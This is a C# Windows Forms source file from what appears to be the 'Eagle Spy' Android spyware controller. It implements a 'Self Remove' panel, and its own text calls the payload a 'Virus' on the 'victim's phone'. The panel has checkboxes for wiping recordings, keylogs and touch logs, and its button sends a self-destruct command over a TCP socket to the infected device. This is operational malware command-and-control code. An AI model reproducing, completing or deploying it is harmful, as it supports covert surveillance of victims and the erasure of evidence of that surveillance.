using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Eagle_Spy.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy;

[DesignerGenerated]
public class SelfRemove : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon1")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon1;

	public Client Classclient;

	[field: AccessedThroughProperty("Label34")]
	internal Label Label34
    ;

    [field: AccessedThroughProperty("Label1")]
	internal Label Label1
    ;

    [field: AccessedThroughProperty("Label2")]
	internal Label Label2
	;

	internal DrakeUIButtonIcon DrakeUIButtonIcon1
	;

	[field: AccessedThroughProperty("clientpic")]
	internal PictureBox clientpic
    ;

    [field: AccessedThroughProperty("checkrecords")]
	internal DrakeUICheckBox checkrecords
    ;

    [field: AccessedThroughProperty("checkkeylogs")]
	internal DrakeUICheckBox checkkeylogs
    ;
    private Label label3;
    [field: AccessedThroughProperty("checktouch")]
	internal DrakeUICheckBox checktouch
;

    public SelfRemove()
	{
		base.Load += SelfRemove_Load;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
				components.Dispose();
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
            this.Label34 = new System.Windows.Forms.Label();
            this.Label1 = new System.Windows.Forms.Label();
            this.Label2 = new System.Windows.Forms.Label();
            this.DrakeUIButtonIcon1 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.clientpic = new System.Windows.Forms.PictureBox();
            this.checkrecords = new DrakeUI.Framework.DrakeUICheckBox();
            this.checkkeylogs = new DrakeUI.Framework.DrakeUICheckBox();
            this.checktouch = new DrakeUI.Framework.DrakeUICheckBox();
            this.label3 = new System.Windows.Forms.Label();
            ((System.ComponentModel.ISupportInitialize)(this.clientpic)).BeginInit();
            this.SuspendLayout();
            // 
            // Label34
            // 
            this.Label34.AutoSize = true;
            this.Label34.BackColor = System.Drawing.Color.Transparent;
            this.Label34.Font = new System.Drawing.Font("Calibri", 15F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Label34.ForeColor = System.Drawing.Color.White;
            this.Label34.Location = new System.Drawing.Point(99, 161);
            this.Label34.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.Label34.Name = "Label34";
            this.Label34.Size = new System.Drawing.Size(148, 24);
            this.Label34.TabIndex = 66;
            this.Label34.Text = "Remove Records";
            this.Label34.Visible = false;
            // 
            // Label1
            // 
            this.Label1.AutoSize = true;
            this.Label1.BackColor = System.Drawing.Color.Transparent;
            this.Label1.Font = new System.Drawing.Font("Calibri", 15F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Label1.ForeColor = System.Drawing.Color.White;
            this.Label1.Location = new System.Drawing.Point(99, 238);
            this.Label1.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.Label1.Name = "Label1";
            this.Label1.Size = new System.Drawing.Size(143, 24);
            this.Label1.TabIndex = 68;
            this.Label1.Text = "Remove keylogs";
            this.Label1.Visible = false;
            // 
            // Label2
            // 
            this.Label2.AutoSize = true;
            this.Label2.BackColor = System.Drawing.Color.Transparent;
            this.Label2.Font = new System.Drawing.Font("Calibri", 15F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Label2.ForeColor = System.Drawing.Color.White;
            this.Label2.Location = new System.Drawing.Point(99, 314);
            this.Label2.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.Label2.Name = "Label2";
            this.Label2.Size = new System.Drawing.Size(148, 24);
            this.Label2.TabIndex = 70;
            this.Label2.Text = "Remove touches";
            this.Label2.Visible = false;
            // 
            // DrakeUIButtonIcon1
            // 
            this.DrakeUIButtonIcon1.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIButtonIcon1.FillColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon1.Font = new System.Drawing.Font("Bahnschrift", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.DrakeUIButtonIcon1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon1.Location = new System.Drawing.Point(21, 238);
            this.DrakeUIButtonIcon1.Name = "DrakeUIButtonIcon1";
            this.DrakeUIButtonIcon1.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon1.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.DrakeUIButtonIcon1.Size = new System.Drawing.Size(363, 38);
            this.DrakeUIButtonIcon1.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIButtonIcon1.Symbol = 61944;
            this.DrakeUIButtonIcon1.TabIndex = 71;
            this.DrakeUIButtonIcon1.Text = "UNINSTALL NOW";
            this.DrakeUIButtonIcon1.Click += new System.EventHandler(this.DrakeUIButtonIcon1_Click);
            // 
            // clientpic
            // 
            this.clientpic.Image = global::Eagle_Spy_Applications.remo;
            this.clientpic.Location = new System.Drawing.Point(192, 12);
            this.clientpic.Name = "clientpic";
            this.clientpic.Size = new System.Drawing.Size(50, 47);
            this.clientpic.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.clientpic.TabIndex = 72;
            this.clientpic.TabStop = false;
            // 
            // checkrecords
            // 
            this.checkrecords.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(136)))), ((int)(((byte)(229)))));
            this.checkrecords.Cursor = System.Windows.Forms.Cursors.Hand;
            this.checkrecords.Font = new System.Drawing.Font("Calibri", 12F);
            this.checkrecords.Location = new System.Drawing.Point(21, 162);
            this.checkrecords.Name = "checkrecords";
            this.checkrecords.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
            this.checkrecords.Size = new System.Drawing.Size(45, 33);
            this.checkrecords.TabIndex = 73;
            this.checkrecords.Visible = false;
            // 
            // checkkeylogs
            // 
            this.checkkeylogs.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(136)))), ((int)(((byte)(229)))));
            this.checkkeylogs.Cursor = System.Windows.Forms.Cursors.Hand;
            this.checkkeylogs.Font = new System.Drawing.Font("Calibri", 12F);
            this.checkkeylogs.Location = new System.Drawing.Point(21, 240);
            this.checkkeylogs.Name = "checkkeylogs";
            this.checkkeylogs.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
            this.checkkeylogs.Size = new System.Drawing.Size(45, 33);
            this.checkkeylogs.TabIndex = 74;
            this.checkkeylogs.Visible = false;
            // 
            // checktouch
            // 
            this.checktouch.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(136)))), ((int)(((byte)(229)))));
            this.checktouch.Cursor = System.Windows.Forms.Cursors.Hand;
            this.checktouch.Font = new System.Drawing.Font("Calibri", 12F);
            this.checktouch.Location = new System.Drawing.Point(21, 316);
            this.checktouch.Name = "checktouch";
            this.checktouch.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
            this.checktouch.Size = new System.Drawing.Size(45, 33);
            this.checktouch.TabIndex = 75;
            this.checktouch.Visible = false;
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.ForeColor = System.Drawing.Color.White;
            this.label3.Location = new System.Drawing.Point(16, 85);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(354, 54);
            this.label3.TabIndex = 76;
            this.label3.Text = "After Self Destruct, Virus will be completely remove\r\nFrom victim\'s phone and you" +
    " will not have \r\naccess on this phone";
            // 
            // SelfRemove
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 18F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Black;
            this.ClientSize = new System.Drawing.Size(453, 321);
            this.Controls.Add(this.DrakeUIButtonIcon1);
            this.Controls.Add(this.label3);
            this.Controls.Add(this.checktouch);
            this.Controls.Add(this.checkkeylogs);
            this.Controls.Add(this.clientpic);
            this.Controls.Add(this.Label2);
            this.Controls.Add(this.Label1);
            this.Controls.Add(this.Label34);
            this.Controls.Add(this.checkrecords);
            this.Font = new System.Drawing.Font("Bahnschrift", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
            this.MaximumSize = new System.Drawing.Size(469, 360);
            this.MinimumSize = new System.Drawing.Size(469, 360);
            this.Name = "SelfRemove";
            this.ShowIcon = false;
            this.Text = "Self Remove";
            this.TopMost = true;
            ((System.ComponentModel.ISupportInitialize)(this.clientpic)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		
			TcpClient myClient = Classclient.myClient;
			string[] array = Classclient.Keys.Split(':');
			int num = 0;
			int num2 = 0;
			string text = "";
			if (checkrecords.Checked)
				text += "_RE_";
			if (checkkeylogs.Checked)
				text += "_FK_";
			if (checktouch.Checked)
				text += "_TH_";
			object[] parametersObjects = new object[4]
			{
				myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "SFD<*>SLF" + text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(num) + Data.SPL_SOCKET + Conversions.ToString(num2) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				Classclient
			};
			Classclient.SendMessage(parametersObjects);
			
		}
		
	
	private void translateme()
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "AR", TextCompare: false) == 0)
			{
				Label1.Text = Codes.Translate(Label1.Text, "en", "ar");
				Label2.Text = Codes.Translate(Label2.Text, "en", "ar");
				Label34.Text = Codes.Translate(Label34.Text, "en", "ar");
			}
		}
		else
		{
			Label1.Text = Codes.Translate(Label1.Text, "en", "zh");
			Label2.Text = Codes.Translate(Label2.Text, "en", "zh");
			Label34.Text = Codes.Translate(Label34.Text, "en", "zh");
		}
	}

	private void SelfRemove_Load(object sender, EventArgs e)
	{
		clientpic.Image = Classclient.Wallpaper;
	}
}
